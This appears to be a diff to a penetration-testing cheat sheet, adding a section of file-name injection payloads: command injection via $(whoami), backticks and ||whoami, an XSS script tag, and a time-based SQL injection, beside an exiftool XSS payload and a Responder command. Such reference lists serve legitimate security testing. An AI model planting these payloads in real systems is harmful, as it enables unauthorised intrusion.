@@ -168,3 +168,9 @@ sudo responder -I tun0 -A
 ```
 exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
 ```
+### Injections in File Name
+```
+file$(whoami).jpg or file`whoami`.jpg or file.jpg||whoami  
+<script>alert(window.origin);</script>  
+file';select+sleep(5);--.jpg
+```
